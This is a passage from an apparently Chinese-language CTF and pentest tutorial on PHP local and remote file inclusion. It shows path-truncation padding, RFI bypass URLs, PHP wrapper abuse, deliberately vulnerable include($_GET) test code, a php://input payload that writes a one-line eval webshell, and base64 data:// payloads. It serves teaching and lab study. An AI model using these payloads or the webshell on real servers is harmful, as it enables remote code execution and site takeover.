data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dC8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8uLy4vLi8=\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</span></p>\n</div>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<h3 id=\"点号截断\"><a class=\"anchor\" href=\"#点号截断\">#</a> 点号截断</h3>\n<p>条件：windows OS，点号需要长于 256</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$filename</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><div class=\"tab\" data-id=\"id2\" data-title=\"EXP:\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jdGZzLXdpa2kuY29tL0ZJL0ZJLnBocD9maWxlbmFtZT10ZXN0LnR4dA==\">http://www.ctfs-wiki.com/FI/FI.php?filename=test.txt</span>.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</p>\n</div>\n<h1 id=\"远程文件包含\"><a class=\"anchor\" href=\"#远程文件包含\">#</a> 远程文件包含</h1>\n<p>PHP 的配置文件 allow_url_fopen 和 allow_url_include 设置为 ON，include/require 等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>\n<div class=\"note info\">\n<p>allow_url_fopen = On（是否允许打开远程文件）<br />\nallow_url_include = On（是否允许 include/require 远程文件）</p>\n</div>\n<h2 id=\"无限制远程文件包含\"><a class=\"anchor\" href=\"#无限制远程文件包含\">#</a> 无限制远程文件包含</h2>\n<p>和无限制本地文件包含差不多。不再介绍（懒蛋。。）<br />\n<img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"有限制远程文件包含\"><a class=\"anchor\" href=\"#有限制远程文件包含\">#</a> 有限制远程文件包含</h2>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\".html\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>代码中多添加了 html 后缀，导致远程包含的文件也会多一个 html 后缀。</p>\n<h3 id=\"绕过姿势\"><a class=\"anchor\" href=\"#绕过姿势\">#</a> 绕过姿势</h3>\n<ol>\n<li>\n<p>问号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt?</code> <br />\n<img data-src=\"image012.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>#号绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%23</code> <br />\n<img data-src=\"image011.png\" alt=\"\" /></p>\n</li>\n<li>\n<p>空格 (%20) 绕过<br />\n <code>http://192.168.199.130/test.php?filename=http://192.168.199.131/php.txt%20</code> <br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n</li>\n</ol>\n<h1 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h1>\n<p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen ()、 copy ()、 file_exists () 和 filesize () 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register () 来注册自定义的封装协议。</p>\n<p>支持的种类有这 12 种</p>\n<ul>\n<li>file:// — 访问本地文件系统</li>\n<li>http:// — 访问 HTTP (s) 网址</li>\n<li>ftp:// — 访问 FTP (s) URLs</li>\n<li>php:// — 访问各个输入 / 输出流（I/O streams）</li>\n<li>zlib:// — 压缩流</li>\n<li>data:// — 数据（RFC 2397）</li>\n<li>glob:// — 查找匹配的文件路径模式</li>\n<li>phar:// — PHP 归档</li>\n<li>ssh2:// — Secure Shell 2</li>\n<li>rar:// — RAR</li>\n<li>ogg:// — 音频流</li>\n<li>expect:// — 处理交互式的流</li>\n</ul>\n<h2 id=\"php-输入输出流\"><a class=\"anchor\" href=\"#php-输入输出流\">#</a> php:// 输入输出流</h2>\n<p>PHP 提供了一些杂项输入 / 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>\n<h2 id=\"phpstdin-phpstdout-和-phpstderr\"><a class=\"anchor\" href=\"#phpstdin-phpstdout-和-phpstderr\">#</a> php://stdin, php://stdout 和 php://stderr</h2>\n<p>php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开 php://stdin 并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 推荐简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p>\n<p><span class=\"label warning\">php://stdin 是只读的，php://stdout 和 php://stderr 是只写的。</span></p>\n<p><span class=\"label success\">📣举例</span></p>\n<ol>\n<li><span class=\"label info\">php://stdin</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdin'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span><span class=\"token comment\">//open our file pointer to read from stdin</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$line</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$line</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 读取</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行读取</p>\n<ol start=\"2\">\n<li><span class=\"label info\">php://stdout</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$fd</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://stdout'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$fd</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"这是一个测试\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image019.png\" alt=\"\" /><br />\n可以看到打开了一个文件指针进行写入</p>\n<ol start=\"3\">\n<li><span class=\"label info\">php://stderr</span></li>\n</ol>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$stderr</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'php://stderr'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'w'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$stderr</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"lalala\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$stderr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>可以看到打开了一个文件指针进行写入</p>\n<h2 id=\"phpinput\"><a class=\"anchor\" href=\"#phpinput\">#</a> php://input</h2>\n<p>php://input 是个可以访问请求的原始数据的只读流。因为它不依赖于特定的 php.ini 指令。<br />\n<span class=\"label warning\">注：enctype=”multipart/form-data” 的时候 php://input 是无效的。</span></p>\n<h3 id=\"phpinput-读取post数据\"><a class=\"anchor\" href=\"#phpinput-读取post数据\">#</a> php://input （读取 POST 数据）</h3>\n<p>碰到 file_get_contents () 就要想到用 php://input 绕过，因为 php 伪协议也是可以利用 http 协议的，即可以使用 POST 方式传数据，具体函数意义下一项；</p>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre># 1.php文件</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"php://input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>访问 <code>http://192.168.199.130/1.php</code> burp 抓包，添加 post 数据。</p>\n<p><span class=\"label\">结果</span></p>\n<p><img data-src=\"image021.png\" alt=\"\" /></p>\n<h3 id=\"phpinput写马\"><a class=\"anchor\" href=\"#phpinput写马\">#</a> php://input 写马</h3>\n<p>测试代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.3.0）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行。</p>\n<p>如果 POST 的数据是执行写入一句话木马的 PHP 代码，就会在当前目录下写入一个木马。</p>\n<p><code>&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> <br />\n<span class=\"lebal info\"> 图片</span></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p><span class=\"label info\">当 allow_url_include=Off 时是不行的</span></p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<h3 id=\"phpinput命令执行\"><a class=\"anchor\" href=\"#phpinput命令执行\">#</a> php://input 命令执行</h3>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>条件：<ins>php 配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）</ins>, 就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即 POST 过去 PHP 代码，即可执行；<br />\n<span class=\"lebal info\">图片</span></p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<h2 id=\"phpfilter本地磁盘文件进行读取\"><a class=\"anchor\" href=\"#phpfilter本地磁盘文件进行读取\">#</a> php://filter（本地磁盘文件进行读取）</h2>\n<p>元封装器，设计用于 &quot;数据流打开&quot; 时的 &quot;筛选过滤&quot; 应用，对本地磁盘文件进行读写。</p>\n<p>用法：<br />\n <code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code> <br />\n <code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code>  一样。</p>\n<p>条件：只是读取，需要开启 allow_url_fopen，不需要开启 allow_url_include；</p>\n<p>php://filter 参数</p>\n<table>\n    <tr>\n        <th>名称</th>\n        <th>描述</th>\n        <th>备注</th>\n    </tr>\n    <tr>\n        <td>resource=&lt;要过滤的数据流&gt;</td>\n        <td>指定了你要筛选过滤的数据流。</td>\n        <td>必选</td>\n    </tr>\n    <tr>\n        <td>read=&lt;读链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>write=&lt;写链的筛选列表&gt;</td>\n        <td>可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>\n        <td>可选</td>\n    </tr>\n    <tr>\n        <td>&lt;；两个链的筛选列表&gt;</td>\n        <td>任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>\n        <td>&nbsp;</td>\n    </tr>\n</table>\n<p>过滤器详解<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDYjdDg=\"> https://blog.csdn.net/ni9htmar3/article/details/69812306#t8</span></p>\n<h2 id=\"file伪协议读取文件内容\"><a class=\"anchor\" href=\"#file伪协议读取文件内容\">#</a> file:// 伪协议 (读取文件内容)</h2>\n<p>通过 file 协议可以访问本地文件系统，读取到文件的内容</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"image025.png\" alt=\"\" /></p>\n<h2 id=\"data伪协议\"><a class=\"anchor\" href=\"#data伪协议\">#</a> data:// 伪协议</h2>\n<p>数据流封装器，和 php:// 相似都是利用了流的概念，将原本的 include 的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入 payload 来实现目的；  <code>data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</code></p>\n<p>data://（读取文件）<br />\n和 php 伪协议的 input 类似，碰到 file_get_contents () 来用； <?php // 打印 \"I love PHP\" echo file_get_contents('data://text/plain;base64,SSBsb3ZlIFBIUAo='); ?></p>\n<p>注意：&lt;span style=&quot;color: rgb (121, 121, 121);&quot;&gt;&lt;?php phpinfo ();, 这类执行代码最后没有？&gt;&lt;/span &gt; 闭合；</p>\n<p>如果 php.ini 里的 allow_url_include=On（PHP &lt; 5.3.0）, 就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） 测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>payload:  <code>http://192.168.199.130/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<h2 id=\"phar伪协议\"><a class=\"anchor\" href=\"#phar伪协议\">#</a> phar:// 伪协议</h2>\n<p>这个参数是就是 php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。<br />\n用法：?file=phar:// 压缩包 / 内部文件 phar://xxx.png/shell.php。<br />\n注意： PHP &gt; =5.3.0 压缩包需要是 zip 协议压缩，rar 不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br />\n步骤： 写一个一句话木马文件 shell.php，然后用 zip 协议压缩为 shell.zip，然后将后缀改为 png 等其他格式。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"zip伪协议\"><a class=\"anchor\" href=\"#zip伪协议\">#</a> zip:// 伪协议</h2>\n<p>zip 伪协议和 phar 协议类似，但是用法不一样。<br />\n用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。<br />\n条件： PHP &gt; =5.3.0，注意在 windows 下测试要 5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 